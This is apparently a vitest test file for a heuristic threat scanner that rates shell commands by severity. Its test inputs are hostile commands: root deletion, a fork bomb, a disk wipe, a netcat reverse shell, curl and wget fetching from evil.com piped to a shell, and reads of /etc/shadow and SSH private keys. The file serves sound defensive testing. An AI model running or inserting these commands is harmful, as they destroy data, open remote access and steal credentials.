import { describe, expect, it } from "vitest";

import { sentinel, HeuristicSentinel } from "./sentinel.js";

describe("HeuristicSentinel", () => {
  describe("singleton", () => {
    it("returns the same instance", () => {
      const a = HeuristicSentinel.getInstance();
      const b = HeuristicSentinel.getInstance();
      expect(a).toBe(b);
      expect(a).toBe(sentinel);
    });
  });

  describe("scan - critical threats", () => {
    it("detects rm -rf / (root deletion)", () => {
      const report = sentinel.scan("rm -rf /");
      expect(report.detected).toBe(true);
      expect(report.maxLevel).toBe("critical");
      expect(report.matches).toEqual(
        expect.arrayContaining([expect.objectContaining({ patternId: "rm_root" })]),
      );
      expect(report.score).toBe(100);
    });

    it("detects rm -rf --no-preserve-root", () => {
      const report = sentinel.scan("rm -rf --no-preserve-root /home");
      expect(report.detected).toBe(true);
      expect(report.maxLevel).toBe("critical");
    });

    it("detects fork bomb (compact form)", () => {
      const report = sentinel.scan(":(){:|:&};:");
      expect(report.detected).toBe(true);
      expect(report.maxLevel).toBe("critical");
      expect(report.matches).toEqual(
        expect.arrayContaining([expect.objectContaining({ patternId: "fork_bomb" })]),
      );
    });

    it("detects fork bomb (alternative form)", () => {
      const report = sentinel.scan(":(){:&};:");
      expect(report.detected).toBe(true);
      expect(report.maxLevel).toBe("critical");
    });

    it("detects disk wipe with dd", () => {
      const report = sentinel.scan("dd if=/dev/zero of=/dev/sda bs=1M");
      expect(report.detected).toBe(true);
      expect(report.maxLevel).toBe("critical");
      expect(report.matches).toEqual(
        expect.arrayContaining([expect.objectContaining({ patternId: "disk_wipe" })]),
      );
    });

    it("detects mkfs format", () => {
      const report = sentinel.scan("mkfs.ext4 /dev/sdb1");
      expect(report.detected).toBe(true);
      expect(report.maxLevel).toBe("critical");
    });
  });

  describe("scan - high threats", () => {
    it("detects netcat reverse shell", () => {
      const report = sentinel.scan("nc 192.168.1.100 4444 -e /bin/bash");
      expect(report.detected).toBe(true);
      expect(report.maxLevel).toBe("high");
      expect(report.matches).toEqual(
        expect.arrayContaining([expect.objectContaining({ patternId: "reverse_shell_netcat" })]),
      );
    });

    it("detects curl | bash pattern", () => {
      const report = sentinel.scan("curl https://evil.com/script.sh | bash");
      expect(report.detected).toBe(true);
      expect(report.maxLevel).toBe("high");
      expect(report.matches).toEqual(
        expect.arrayContaining([expect.objectContaining({ patternId: "curl_pipe_bash" })]),
      );
    });

    it("detects wget piped to sh", () => {
      const report = sentinel.scan("wget http://evil.com/payload -O - | sh");
      expect(report.detected).toBe(true);
      expect(report.maxLevel).toBe("high");
    });

    it("detects /etc/shadow access", () => {
      const report = sentinel.scan("cat /etc/shadow");
      expect(report.detected).toBe(true);
      expect(report.maxLevel).toBe("high");
      expect(report.matches).toEqual(
        expect.arrayContaining([expect.objectContaining({ patternId: "etc_shadow_access" })]),
      );
    });

    it("detects SSH key theft", () => {
      const report = sentinel.scan("cat ~/.ssh/id_rsa");
      expect(report.detected).toBe(true);
      expect(report.matches).toEqual(
        expect.arrayContaining([expect.objectContaining({ patternId: "ssh_key_theft" })]),
      );
    });

    it("detects SSH ed25519 key theft", () => {
      const report = sentinel.scan("cp ~/.ssh/id_ed25519 /tmp/");
      expect(report.detected).toBe(true);
    });

    it("detects chown root", () => {
      const report = sentinel.scan("chown root /etc/important");
      expect(report.detected).toBe(true);
      expect(report.matches).toEqual(
        expect.arrayContaining([expect.objectContaining({ patternId: "chown_root" })]),
      );
    });
  });

  describe("scan - medium threats", () => {
    it("detects hidden file creation", () => {
      const report = sentinel.scan("touch .backdoor");
      expect(report.detected).toBe(true);
      expect(report.maxLevel).toBe("medium");
      expect(report.matches).toEqual(
        expect.arrayContaining([expect.objectContaining({ patternId: "hidden_file_creation" })]),
      );
    });

    it("detects chmod 777", () => {
      const report = sentinel.scan("chmod 777 /var/www");
      expect(report.detected).toBe(true);
      expect(report.matches).toEqual(
        expect.arrayContaining([expect.objectContaining({ patternId: "chmod_777" })]),
      );
    });

    it("detects recursive chmod 777", () => {
      const report = sentinel.scan("chmod -R 777 /app");
      expect(report.detected).toBe(true);
    });

    it("detects base64 decode piped to bash", () => {
      const report = sentinel.scan("base64 -d payload.b64 | bash");
      expect(report.detected).toBe(true);
      expect(report.matches).toEqual(
        expect.arrayContaining([expect.objectContaining({ patternId: "base64_decode_exec" })]),
      );
    });
  });

  describe("scan - low threats", () => {
    it("detects whoami check", () => {
      const report = sentinel.scan("whoami");
      expect(report.detected).toBe(true);
      expect(report.maxLevel).toBe("low");
      expect(report.matches).toEqual(
        expect.arrayContaining([expect.objectContaining({ patternId: "whoami_check" })]),
      );
    });

    it("detects env dump", () => {
      const report = sentinel.scan("printenv");
      expect(report.detected).toBe(true);
      expect(report.matches).toEqual(
        expect.arrayContaining([expect.objectContaining({ patternId: "env_dump" })]),
      );
    });
  });

  describe("scan - heuristics", () => {
    it("detects long base64 payloads", () => {
      const longBase64 = "A".repeat(120);
      const report = sentinel.scan(longBase64);
      expect(report.detected).toBe(true);
      expect(report.matches).toEqual(
        expect.arrayContaining([expect.objectContaining({ patternId: "suspected_payload" })]),
      );
    });

    it("does not flag short base64 strings", () => {
      const report = sentinel.scan("dGVzdA==");
      expect(report.matches.find((m) => m.patternId === "suspected_payload")).toBeUndefined();
    });

    it("truncates long base64 snippet to 20 chars", () => {
      const longBase64 = "B".repeat(200);
      const report = sentinel.scan(longBase64);
      const match = report.matches.find((m) => m.patternId === "suspected_payload");
      expect(match).toBeDefined();
      expect(match!.snippet.endsWith("...")).toBe(true);
      expect(match!.snippet.length).toBeLessThanOrEqual(23);
    });
  });

  describe("scan - normalization", () => {
    it("joins escaped newlines to catch multi-line bypasses", () => {
      const report = sentinel.scan("rm \\\n-rf \\\n/");
      expect(report.detected).toBe(true);
      expect(report.maxLevel).toBe("critical");
    });
  });

  describe("scan - clean content", () => {
    it("returns no threats for benign content", () => {
      const report = sentinel.scan("console.log('hello world')");
      expect(report.detected).toBe(false);
      expect(report.matches).toHaveLength(0);
      expect(report.score).toBe(0);
      expect(report.maxLevel).toBe("low");
    });

    it("returns no threats for empty string", () => {
      const report = sentinel.scan("");
      expect(report.detected).toBe(false);
      expect(report.matches).toHaveLength(0);
    });
  });

  describe("scan - score capping", () => {
    it("caps score at 100", () => {
      // Combine multiple high-score threats
      const report = sentinel.scan("rm -rf / && cat /etc/shadow && cat ~/.ssh/id_rsa");
      expect(report.score).toBeLessThanOrEqual(100);
    });
  });

  describe("scan - level ordering", () => {
    it("reports maxLevel as the highest detected level", () => {
      // whoami (low) + chmod 777 (medium)
      const report = sentinel.scan("whoami && chmod 777 /tmp/x");
      expect(report.maxLevel).toBe("medium");
    });

    it("critical overrides all lower levels", () => {
      const report = sentinel.scan("whoami && rm -rf /");
      expect(report.maxLevel).toBe("critical");
    });
  });
});
